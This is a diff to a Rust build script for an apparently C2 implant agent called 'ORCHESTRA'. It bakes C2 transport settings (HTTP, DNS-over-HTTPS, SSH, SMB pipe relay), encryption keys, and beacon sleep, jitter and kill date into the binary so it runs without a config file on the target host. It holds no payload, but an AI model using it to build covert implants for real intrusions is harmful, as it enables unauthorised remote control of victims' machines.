@@ -141,6 +141,14 @@ fn make_rng() -> Xoshiro256PlusPlus {
     Xoshiro256PlusPlus::from_seed(seed)
 }
 
+fn forward_trimmed_env(source: &str, target: &str) {
+    if let Ok(value) = std::env::var(source) {
+        if !value.trim().is_empty() {
+            println!("cargo:rustc-env={}={}", target, value.trim());
+        }
+    }
+}
+
 fn main() {
     println!("cargo:rerun-if-env-changed=ORCHESTRA_KEY");
     println!("cargo:rerun-if-env-changed=ORCHESTRA_NONCE");
@@ -150,7 +158,24 @@ fn main() {
     println!("cargo:rerun-if-env-changed=ORCHESTRA_C_ADDR");
     println!("cargo:rerun-if-env-changed=ORCHESTRA_C_SECRET");
     println!("cargo:rerun-if-env-changed=ORCHESTRA_C_CERT_FP");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_TRANSPORT");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_HTTP_ENDPOINT");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_HTTP_HOST_HEADER");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_DOH_SERVER_URL");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_DOH_DOMAIN");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_HOST");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_PORT");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_USERNAME");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_AUTH_JSON");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_HOST_KEY_FP");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SMB_PIPE_HOST");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SMB_PIPE_NAME");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SMB_PIPE_MODE");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SMB_TCP_RELAY_PORT");
     println!("cargo:rerun-if-env-changed=ORCHESTRA_MODULE_AES_KEY");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_SLEEP_MS");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_JITTER");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_KILL_DATE");
     println!("cargo:rustc-check-cfg=cfg(has_sys_driver_path)");
 
     // ── C2 address / secret / cert fingerprint baking ───────────────────────
@@ -172,12 +197,46 @@ fn main() {
             println!("cargo:rustc-env=SYS_C_CERT_FP={}", fp.trim());
         }
     }
+    forward_trimmed_env("ORCHESTRA_TRANSPORT", "SYS_TRANSPORT");
+    forward_trimmed_env("ORCHESTRA_HTTP_ENDPOINT", "SYS_HTTP_ENDPOINT");
+    forward_trimmed_env("ORCHESTRA_HTTP_HOST_HEADER", "SYS_HTTP_HOST_HEADER");
+    forward_trimmed_env("ORCHESTRA_DOH_SERVER_URL", "SYS_DOH_SERVER_URL");
+    forward_trimmed_env("ORCHESTRA_DOH_DOMAIN", "SYS_DOH_DOMAIN");
+    forward_trimmed_env("ORCHESTRA_SSH_HOST", "SYS_SSH_HOST");
+    forward_trimmed_env("ORCHESTRA_SSH_PORT", "SYS_SSH_PORT");
+    forward_trimmed_env("ORCHESTRA_SSH_USERNAME", "SYS_SSH_USERNAME");
+    forward_trimmed_env("ORCHESTRA_SSH_AUTH_JSON", "SYS_SSH_AUTH_JSON");
+    forward_trimmed_env("ORCHESTRA_SSH_HOST_KEY_FP", "SYS_SSH_HOST_KEY_FP");
+    forward_trimmed_env("ORCHESTRA_SMB_PIPE_HOST", "SYS_SMB_PIPE_HOST");
+    forward_trimmed_env("ORCHESTRA_SMB_PIPE_NAME", "SYS_SMB_PIPE_NAME");
+    forward_trimmed_env("ORCHESTRA_SMB_PIPE_MODE", "SYS_SMB_PIPE_MODE");
+    forward_trimmed_env("ORCHESTRA_SMB_TCP_RELAY_PORT", "SYS_SMB_TCP_RELAY_PORT");
     // ── Module AES key baking ─────────────────────────────────────────────────
     // When the server-side build injects ORCHESTRA_MODULE_AES_KEY, bake it in
     // so the agent doesn't require an agent.toml at runtime for module loading.
     if let Ok(module_key) = std::env::var("ORCHESTRA_MODULE_AES_KEY") {
         if !module_key.trim().is_empty() {
             println!("cargo:rustc-env=SYS_MODULE_KEY={}", module_key.trim());
+        }
+    }
+
+    // ── Agent behavior settings ─────────────────────────────────────────────
+    // Server-side build requests use these fields to produce self-contained
+    // agents whose timing and kill date do not depend on agent.toml being
+    // present on the target host.
+    if let Ok(sleep_ms) = std::env::var("ORCHESTRA_SLEEP_MS") {
+        if !sleep_ms.trim().is_empty() {
+            println!("cargo:rustc-env=SYS_SLEEP_MS={}", sleep_ms.trim());
+        }
+    }
+    if let Ok(jitter) = std::env::var("ORCHESTRA_JITTER") {
+        if !jitter.trim().is_empty() {
+            println!("cargo:rustc-env=SYS_JITTER={}", jitter.trim());
+        }
+    }
+    if let Ok(kill_date) = std::env::var("ORCHESTRA_KILL_DATE") {
+        if !kill_date.trim().is_empty() {
+            println!("cargo:rustc-env=SYS_KILL_DATE={}", kill_date.trim());
         }
     }
 
